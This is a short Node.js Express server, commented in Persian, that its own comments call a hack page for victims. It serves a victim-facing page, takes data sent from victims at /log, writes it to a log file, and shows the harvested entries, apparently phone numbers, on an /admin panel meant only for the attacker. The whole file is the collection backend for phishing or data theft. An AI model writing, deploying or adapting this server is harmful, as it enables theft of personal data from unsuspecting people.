const express = require('express');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

// مسیر فایل لاگ
const LOG_FILE = 'logs.txt';

// middleware برای خواندن متن
app.use(express.text());

// 1. صفحه اصلی (همان صفحه هک برای قربانی)
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// 2. دریافت داده‌ها از قربانی
app.post('/log', (req, res) => {
    const data = req.body;
    const timestamp = new Date().toLocaleString();
    
    // اضافه کردن به فایل لاگ
    fs.appendFileSync(LOG_FILE, `[${timestamp}] ${data}\n`);
    
    res.send('OK');
});

// 3. پنل ادمین (مشاهده شماره‌ها - فقط برای تو)
app.get('/admin', (req, res) => {
    try {
        const logs = fs.readFileSync(LOG_FILE, 'utf8') || "No data yet.";
        res.send(`<pre style="background:#111; color:#0f0; padding:20px;">${logs}</pre>`);
    } catch (e) {
        res.send("Error reading logs.");
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
